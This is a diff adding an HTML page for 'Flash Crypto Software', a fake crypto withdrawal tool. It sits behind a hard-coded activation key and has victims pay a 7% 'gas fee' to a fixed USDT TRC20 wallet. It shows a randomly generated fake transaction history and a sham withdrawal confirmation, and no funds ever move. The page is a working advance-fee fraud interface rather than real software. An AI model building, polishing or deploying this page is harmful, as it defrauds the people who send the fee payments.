@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Crypto Software</title>
+    <style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: url('image.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: #f0f0f0;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+        
+        .container {
+            width: 40%;
+            padding: 2em;
+            background: linear-gradient(145deg, #3a3a3a, #1a1a1a);
+            border-radius: 15px;
+            box-shadow: 10px 10px 30px #000000, -10px -10px 30px #333333;
+            text-align: center;
+        }
+
+        .copy-btn {
+        background-color: #4CAF50;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+    
+    .copy-btn:hover {
+        background-color: #45a049;
+    }
+
+    #feeBanner {
+        margin-top: 20px;
+        padding: 15px;
+        background-color: #333333;
+        border-radius: 10px;
+        text-align: center;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+        h1 {
+            color: #ffc107;
+            margin-bottom: 1em;
+        }
+        label {
+            display: block;
+            margin: 1em 0 0.5em;
+        }
+        input[type="text"], input[type="password"], input[type="email"], select {
+            width: 90%;
+            padding: 0.75em;
+            margin-bottom: 1em;
+            border: none;
+            border-radius: 5px;
+            box-shadow: inset 3px 3px 8px #141414, inset -3px -3px 8px #2e2e2e;
+            background-color: #2c2c2c;
+            color: #f0f0f0;
+        }
+        button {
+            padding: 0.75em 2em;
+            margin-top: 1em;
+            color: #fff;
+            background-color: #ffc107;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        button:hover {
+            background-color: #e0a800;
+        }
+        .hidden {
+            display: none;
+        }
+        #lockScreen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .copy-btn {
+            background-color: #e0a800; /* Green */
+            border: none;
+        }
+        .copy-btn:hover {
+            background-color: #e0a800;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="lockScreen">
+        <h1>Activation Required</h1>
+        <input type="password" id="activationKey" placeholder="Enter Activation Key">
+        <button type="button" onclick="unlock()">Unlock</button>
+    </div>
+
+    <div class="container hidden" id="mainContainer">
+        <h1>Flash Crypto Software</h1>
+        <form id="cryptoForm">
+            <label for="exchanger">Select Exchanger:</label>
+            <select id="exchanger" name="exchanger">
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="Coinbase">Coinbase</option>
+                <option value="Metamask">Metamask</option>
+                <option value="Binance">Binance</option>
+            </select>
+
+            <label for="withdrawalAddress">Withdrawal Address:</label>
+            <input type="text" id="withdrawalAddress" name="withdrawalAddress" required>
+
+            <label for="network">Select Coin:</label>
+            <select id="network" name="network" onchange="updateNetworkOptions()">
+                <option value="USDT">USDT</option>
+                <option value="BTC">BTC</option>
+                <option value="BNB">BNB</option>
+                <option value="ETH">Ethereum</option>
+            </select>
+
+            <label for="cryptoNetwork">Network:</label>
+            <select id="cryptoNetwork" name="cryptoNetwork"></select>
+
+            <label for="amount">Amount to Deposit (USDT):</label>
+            <input type="text" id="amount" name="amount" placeholder="Enter amount" required>
+
+            <button type="button" onclick="requestWithdrawal()">Request Withdrawal</button>
+        </form>
+
+        <button type="button" onclick="viewTransactionHistory()">View Transaction History</button>
+    </div>
+
+    <div class="container" id="feeBanner">
+        <h2 style="color: #e0a800;">Important: A 7% Fee for Every Transaction Should Be Paid to the Wallet Address Below</h2>
+        <p id="feeAddress" style="font-weight: bold; color: #f3f0eb;">TYzGP8KTtEc3GZS376wbcmi6pDoHVddJ2g (USDT TRC20)</p>
+        <button class="copy-btn" onclick="copyFeeAddress()">Copy Address</button>
+    </div>
+
+    <div class="container hidden" id="transactionHistory">
+        <h2>Transaction History</h2>
+        <div id="historyContent"></div>
+        <button type="button" onclick="closeTransactionHistory()">Close</button>
+    </div>
+
+    <div class="container hidden" id="copyGasFee">
+        <h2>Gas Fee Wallet Address</h2>
+        <p id="gasFeeAddress">TYzGP8KTtEc3GZS376wbcmi6pDoHVddJ2g (USDT TRC20)</p>
+        <button class="copy-btn" onclick="copyGasFeeAddress()">Copy Address</button>
+    </div>
+
+    <script>
+        let transactions = [];
+        const numTransactions = 100; // Adjust number of transactions here
+        const gasFeeAddress = "TYzGP8KTtEc3GZS376wbcmi6pDoHVddJ2g"; // Gas fee address
+
+        let withdrawalFees = {
+            "USDT": 7,
+            "BTC": 7,
+            "BNB": 7,
+            "ETH": 7
+        };
+        let minWithdrawalAmounts = {
+            "USDT": 500,
+            "BTC": 0.02,
+            "BNB": 1,
+            "ETH": 0.5
+        };
+        let maxWithdrawalAmounts = {
+            "USDT": 1000000,
+            "BTC": 1000,
+            "BNB": 100000,
+            "ETH": 10000
+        };
+
+        // Coin prices in USD
+        let coinPrices = {
+            "BTC": 59000,
+            "BNB": 520,
+            "ETH": 2900
+        };
+
+        // Function to unlock the software
+        function unlock() {
+            const activationKey = document.getElementById("activationKey").value;
+            if (activationKey === "fp36asql") {  // Replace with your actual logic
+                document.getElementById("lockScreen").classList.add("hidden");
+                document.getElementById("mainContainer").classList.remove("hidden");
+            } else {
+                alert("Invalid activation key.");
+            }
+        }
+
+          // Function to generate random transaction history
+function generateTransactionHistory() {
+    transactions = [];
+    for (let i = 1; i <= numTransactions; i++) {
+        const isDeposit = Math.random() > 0.2;
+        const coinType = isDeposit ? "USDT" : ["BTC", "BNB", "ETH"][Math.floor(Math.random() * 3)];
+        const transaction = {
+            id: i,
+            type: isDeposit ? "Deposit" : "Withdrawal",
+            amount: (Math.random() * 5000).toFixed(2) + (isDeposit ? " USDT" : " " + coinType),
+            status: Math.random() > 0.2 ? "Completed" : "Pending",
+            date: new Date().toLocaleDateString(),
+            walletAddress: generateRandomWalletAddress(coinType),
+            ipAddress: getRandomIP()
+        };
+        transactions.push(transaction);
+            }
+        }            
+
+        // Function to generate random wallet address
+        function generateRandomWalletAddress() {
+            const addresses = {
+                "BTC": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
+                "BNB": "bnb1g1jrx3fe6jhpz7lfp7ad8sm55u4v5k3rxwkl95",
+                "ETH": "0x32Be343B94f860124dC4fEe278FDCBD38C102D88"
+            };
+            const coins = ["BTC", "BNB", "ETH"];
+            const randomCoin = coins[Math.floor(Math.random() * coins.length)];
+            return generateRandomAddressForCoin(randomCoin);
+        }
+
+        function generateRandomAddressForCoin(coin) {
+            const baseAddresses = {
+                "BTC": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
+                "BNB": "bnb1g1jrx3fe6jhpz7lfp7ad8sm55u4v5k3rxwkl95",
+                "ETH": "0x32Be343B94f860124dC4fEe278FDCBD38C102D88"
+            };
+
+            const baseAddress = baseAddresses[coin];
+            const randomSuffix = Math.random().toString(36).substr(2, 10);
+            return `${baseAddress.substr(0, baseAddress.length - 10)}${randomSuffix}`;
+        }
+
+        // Function to get random IP address
+        function getRandomIP() {
+            return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+
+        // Function to copy gas fee wallet address
+        function copyGasFeeAddress() {
+            const textArea = document.createElement("textarea");
+            textArea.value = gasFeeAddress;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textArea);
+            alert("Gas fee address copied to clipboard!");
+        }
+
+        // Function to view transaction history
+        function viewTransactionHistory() {
+            generateTransactionHistory(); // Generate transaction history on demand
+            const historyContent = document.getElementById("historyContent");
+            historyContent.innerHTML = transactions.map(tx => `<p>${tx.id}: ${tx.date} - ${tx.type} - ${tx.amount} - ${tx.status} - Address: ${tx.walletAddress} - IP: ${tx.ipAddress}</p>`).join('');
+            document.getElementById("mainContainer").classList.add("hidden");
+            document.getElementById("transactionHistory").classList.remove("hidden");
+        }
+
+        function closeTransactionHistory() {
+            document.getElementById("transactionHistory").classList.add("hidden");
+            document.getElementById("mainContainer").classList.remove("hidden");
+        }
+
+        // Function to request withdrawal
+        function requestWithdrawal() {
+            const address = document.getElementById("withdrawalAddress").value;
+            const coin = document.getElementById("network").value;
+            const cryptoNetwork = document.getElementById("cryptoNetwork").value;
+            const exchanger = document.getElementById("exchanger").value;
+            const amount = parseFloat(document.getElementById("amount").value);
+
+            if (!address || !coin || !cryptoNetwork || !exchanger || isNaN(amount)) {
+                alert("Please enter all required information.");
+                return;
+            }
+
+            function copyFeeAddress() {
+        const feeAddressText = document.getElementById("feeAddress").innerText;
+        const tempTextArea = document.createElement("textarea");
+        tempTextArea.value = feeAddressText;
+        document.body.appendChild(tempTextArea);
+        tempTextArea.select();
+        document.execCommand("copy");
+        document.body.removeChild(tempTextArea);
+        alert("Wallet address copied to clipboard!");
+            }
+
+            // Check minimum withdrawal amount
+            if (amount < minWithdrawalAmounts[coin]) {
+                alert(`The minimum withdrawal amount for ${coin} is ${minWithdrawalAmounts[coin]}.`);
+                return;
+            }
+
+            // Check maximum withdrawal amount
+            if (amount > maxWithdrawalAmounts[coin]) {
+                alert(`The maximum withdrawal amount for ${coin} is ${maxWithdrawalAmounts[coin]}.`);
+                return;
+            }
+
+            let fee;
+            if (coin === "USDT") {
+                fee = (amount * withdrawalFees[coin] / 100).toFixed(2);
+            } else {
+                let usdEquivalent = amount * coinPrices[coin];
+                fee = ((usdEquivalent * withdrawalFees[coin]) / 100).toFixed(2);
+            }
+
+            alert(`You need to pay a Gas fee of $${fee} in USDT to address ${gasFeeAddress}. Please confirm payment.`);
+
+            setTimeout(() => {
+                let feeConfirmed = confirm("Has the Gas fee been paid?");
+                if (feeConfirmed) {
+                    let userEmail = prompt("Enter your Transaction Hash ID for Gas fee confirmation:");
+                    if (userEmail) {
+                        alert("Processing your request...");
+                        setTimeout(() => alert(`Withdrawal request for ${coin} to address ${address} on ${cryptoNetwork} network through ${exchanger} is confirmed.`), 2000);
+                    } else {
+                        alert("Transaction Hash ID  is required for fee confirmation.");
+                    }
+                } else {
+                    alert("Fee payment is required to process withdrawal.");
+                }
+            }, 1000);
+        }
+
+        // Function to update network options based on selected coin
+        function updateNetworkOptions() {
+            const networkSelect = document.getElementById("network").value;
+            const cryptoNetwork = document.getElementById("cryptoNetwork");
+
+            let networks = [];
+            switch (networkSelect) {
+                case "USDT":
+                    networks = ["ERC20", "TRC20", "BEP20"];
+                    break;
+                case "BTC":
+                    networks = ["Bitcoin"];
+                    break;
+                case "BNB":
+                    networks = ["BEP2", "BEP20"];
+                    break;
+                case "ETH":
+                    networks = ["ERC20"];
+                    break;
+            }
+
+            cryptoNetwork.innerHTML = networks.map(network => `<option value="${network}">${network}</option>`).join('');
+        }
+
+        // Initialize default network options
+        document.addEventListener("DOMContentLoaded", updateNetworkOptions);
+    </script>
+</body>
+</html>
